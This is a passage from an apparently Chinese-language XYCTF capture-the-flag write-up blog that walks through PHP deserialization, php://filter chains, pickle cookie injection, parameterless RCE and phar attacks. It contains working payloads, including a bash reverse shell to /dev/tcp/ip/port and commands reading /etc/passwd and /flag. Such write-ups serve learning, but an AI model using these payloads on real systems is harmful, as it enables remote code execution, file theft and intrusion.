class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>命令执行在，<code>echo new $_POST['X']($_POST['Y']);</code><br />好，又是原生类，这次是比较熟悉的，它还告诉了我们要读取<code>flag.php</code><br /><a href="https://blog.csdn.net/unexpectedthing/article/details/121780909">https://blog.csdn.net/unexpectedthing/article/details/121780909</a><br /><code>POST: X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php</code><br />入口是XYCTFNO3::__wakeup()<br />然后关键就到了这<code>if ($this-&gt;adwa-&gt;crypto0 != 'dev1l' or $this-&gt;adwa-&gt;T1ng != 'yuroandCMD258')</code><br />既然<code>crypto0</code>和<code>Ting</code>不属于同一个类，那我们就自己把它构造出来，这就需要对序列化和反序列化有所了解了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span> = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span> = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu-&gt;adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web-连连看到底是连连什么看"><a class="markdownIt-Anchor" href="#web-连连看到底是连连什么看"></a> Web 连连看到底是连连什么看</h2><p>看源码，去<strong>what’s_this.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你甚至能找到差不多的原题，<strong>hscctf2024，ImaginaryCTF Round 28 - Filter Master</strong>，不过这题加了过滤</p><p><a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main</a></p><p><a href="https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/index.html">https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/index.html</a></p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH</a></p><p>跟上面的ezLFI很像，但是这种方法读出来的数据会带有很多的脏数据，我们运行ezLFI的脚本可以发现，而且此处是强比较，所以不能带有脏数据<br /><img src="https://picx.zhimg.com/80/v2-1dd60a035f4c74cf642f5057c2a29e37_1440w.png" alt="" /></p><p><img src="https://pic1.zhimg.com/80/v2-4f763de0bb79649e5a35fe9b49094f6e_1440w.png" alt="" /><br />基于tjjj分享的这两点，我们对<code>XYCTF</code>进行多次base64编码，每次记得删除<code>=</code>，然后每编码一次记得补上一次解码，这个方法是可以剔除脏数据的<br />经过尝试需要6次编码，拿到最后的<code>Vm0xd1ExbFhUWGhUYTJSWVlURndXVlpXUlE</code><br />在这里，我们使用到的工具是这个<br /><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd</span></span><br></pre></td></tr></table></figure><p>得到的p再补上6个<code>|convert.base64-decode</code></p><h2 id="web-login"><a class="markdownIt-Anchor" href="#web-login"></a> Web login</h2><p>flag登录就送？登陆不上啊，尝试看看有没有注册页面，发现<code>register.php</code><br />登陆后，页面没什么信息，但是它的cookie值好奇怪，<code>RememberMe</code>?不会是<code>Shiro反序列化漏洞吧</code><br />再看值<code>gASVMAAAAAAAAACMA2FwcJSMBUxvZ2lulJOUKYGUfZQojARuYW1llIwBYZSMA3B3ZJSMAzEyM5R1Yi4=</code>，base64解密之后可以看见用户信息，那就是<strong>Pickle反序列化</strong>喽</p><p><a href="https://blog.csdn.net/weixin_45669205/article/details/116274988">https://blog.csdn.net/weixin_45669205/article/details/116274988</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>常用的__reduce__魔术方法waf了<br />换个方法<br /><a href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a><br />正好弹个shell试试</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br></pre></td></tr></table></figure><p><strong>payload打回cookie的RememberMe中</strong></p><h2 id="web-pharmex"><a class="markdownIt-Anchor" href="#web-pharmex"></a> Web pharme(x)</h2><p>跳转<code>class.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>if('ch3nx1' === preg_replace('/;+/','ch3nx1' preg_replace('/[A-Za-z_\(\)]+/','',$this-&gt;cmd)))</code><br />要用到A-Z、a-z、()、;<br />很明显是要我们<strong>构造无参RCE</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查看当前目录文件名</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line">随机读取</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br><span class="line">读取上级目录文件</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br><span class="line"></span><br><span class="line">查看和读取根目录文件，概率构造，所获得的字符串第一位有几率是/，需要多试几次</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时，还有注意到这个<br /><strong>eval($this-&gt;cmd.‘isbigvegetablechicken!’);</strong><br />不能把后面的脏数据带一起，不然eval函数执行不了<br />发现<code>.phar</code>无法上传，会出现<br /><strong>!preg_match(“/__HALT_COMPILER/i”,FILE_CONTENTS)</strong><br />所以，刚好这一点可以用来终止文件编译(赛后看了解出来的描述)</p><p><code>if(preg_match('/^phar:\/\//i',$_POST['file']))</code>，post的文件开头不能含有<code>phar://</code><br />绕过<br /><a href="https://vvmdx.github.io/2021/12/05/2021-12-05-Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6Bypass/index.html">https://vvmdx.github.io/2021/12/05/2021-12-05-Phar反序列化及其Bypass/index.html</a></p><p><a href="https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0DRDBGit30%3DKDsA3rziDkDcDQwe%2BhwD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0DRDBGit30%3DKDsA3rziDkDcDQwe%2BhwD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p><p>自己构建一个phar文件，<strong>将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;show_source(array_rand(array_flip(scandir(current(localeconv())))));__halt_compiler();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一篇讲绕过的<br /><a href="https://blog.csdn.net/MrWangisgoodboy/article/details/130146658">https://blog.csdn.net/MrWangisgoodboy/article/details/130146658</a><br />POST:<br /><code>file=compress.zlib://phar://phar.jpg</code><br />问学长，<code>compress.zlib是要开启zip拓展才有的，不一定能用</code><br />gzip压一下，改后缀为jpg<br /><code>file=php://filter/read=convert.base64-encode/resource=phar://phar.phar.jpg/test.txt</code><br />还有的就是文件签名修改</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;phar.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>]  <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:]  <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">new_file = s + sha1(s).digest() + h  <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line">f_gzip = gzip.GzipFile(<span class="string">&quot;phar.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f_gzip.write(new_file)</span><br><span class="line">f_gzip.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有点小问题，还是没打出来，emmm</p><h2 id="web-give-me-flagx"><a class="markdownIt-Anchor" href="#web-give-me-flagx"></a> Web give me flag(x)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">a290ddddf67ee8e5165cfea1d42c4f92</span><br></pre></td></tr></table></figure><p>带时间戳的哈希长度拓展攻击<br />文章<br /><a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a><br />其实也没有讲到时间戳，也还好吧，自己加进去<br />攻击脚本<br /><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a><br />需要增加flag长度爆破(其实不用，动态flag，格式：flagname{uuid.uuid4()}，所以是，7+36=43)，加入时间戳<br />脚本等我复现到了再贴上，因为这个时间戳好像有一丢丢棘手，没解出来？</p><h2 id="web-baby_unserialize"><a class="markdownIt-Anchor" href="#web-baby_unserialize"></a> Web baby_unserialize</h2><p>暂无</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="crypto-sign1n签到"><a class="markdownIt-Anchor" href="#crypto-sign1n签到"></a> Crypto Sign1n[签到]</h2><p>其实就是对代码进行逆向操作，读懂代码，然后稍微改动原代码即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">b = <span class="string">&#xx27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_add</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str)</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        input_list[i] = <span class="built_in">str</span>((<span class="built_in">int</span>(input_list[i]) - i - <span class="number">1</span>) % <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_bits</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str[<span class="number">2</span>:])</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 